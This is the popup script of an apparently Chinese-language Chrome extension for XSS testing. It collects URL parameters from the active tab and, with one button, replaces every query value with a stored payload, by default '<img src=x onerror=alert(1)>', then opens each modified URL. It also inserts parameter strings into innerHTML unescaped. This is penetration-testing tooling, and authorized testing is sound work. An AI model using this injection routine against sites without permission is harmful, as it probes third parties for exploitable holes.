document.addEventListener("DOMContentLoaded", function () {
  const resultsContainer = document.getElementById("results"),
        payloadInput = document.getElementById("payloadInput"),
        savePayloadBtn = document.getElementById("savePayloadBtn");

  mainContainer.style.display = "block";
  loadParameters();

  function loadParameters() {
      chrome.tabs.query({
          active: true,
          currentWindow: true
      }, function (tabs) {
          chrome.tabs.sendMessage(tabs[0].id, {
              action: "getAllParameters"
          }, function (response) {
              resultsContainer.innerHTML = "";
              if (response && response.parameters && response.parameters.length > 0) {
                  response.parameters.forEach(param => {
                      const paramItem = document.createElement("li");
                      paramItem.className = "param-item";
                      if (typeof param === "string") {
                          if (param.startsWith("http") || param.startsWith("https")) {
                              paramItem.innerHTML = `
                                  <span>${param}</span>
                                  <button class="open-btn">打开</button>
                              `;
                              paramItem.querySelector(".open-btn").addEventListener("click", function () {
                                  chrome.tabs.create({
                                      url: param
                                  });
                              });
                          } else {
                              paramItem.textContent = param;
                          }
                      } else {
                          paramItem.textContent = JSON.stringify(param);
                      }
                      resultsContainer.appendChild(paramItem);
                  });
              } else {
                  const noParams = document.createElement("li");
                  noParams.className = "no-params";
                  noParams.textContent = "没找到参数,来一根吧🚬";
                  resultsContainer.appendChild(noParams);

                  const spacer = document.createElement("div");
                  spacer.style.height = "100px";
                  resultsContainer.appendChild(spacer);
              }
          });
      });
  }

  chrome.storage.local.get("xssPayload", function (data) {
      if (data.xssPayload) {
          payloadInput.value = data.xssPayload;
      }
  });

  savePayloadBtn.addEventListener("click", function () {
      const payload = payloadInput.value.trim();
      if (payload) {
          chrome.storage.local.set({
              xssPayload: payload
          }, function () {
            showNotification("Payload 已保存");
          });
      }
  });

  document.querySelector(".refresh-btn").addEventListener("click", function () {
      chrome.tabs.query({
          active: true,
          currentWindow: true
      }, function (tabs) {
          chrome.tabs.reload(tabs[0].id);
      });
  });

  document.querySelector(".xss-btn").addEventListener("click", function () {
      chrome.storage.local.get("xssPayload", function (data) {
          const xssPayload = data.xssPayload || "<img src=x onerror=alert(1)>";
          chrome.tabs.query({
              active: true,
              currentWindow: true
          }, function (tabs) {
              chrome.tabs.sendMessage(tabs[0].id, {
                  action: "getAllParameters"
              }, function (response) {
                  if (response && response.parameters && response.parameters.length > 0) {
                      response.parameters.forEach(param => {
                          const url = new URL(param);
                          const params = new URLSearchParams(url.search);
                          for (const key of params.keys()) {
                              params.set(key, xssPayload);
                          }
                          const newUrl = `${url.origin}${url.pathname}?${params.toString()}`;
                          chrome.tabs.create({
                              url: newUrl
                          });
                      });
                  }
              });
          });
      });
  });

  // 显示通知函数
  function showNotification(message) {
    const notification = document.createElement('div');
    notification.className = 'notification';
    notification.textContent = message;
    document.body.appendChild(notification);

    setTimeout(() => {
        notification.remove();
    }, 3000);
}
});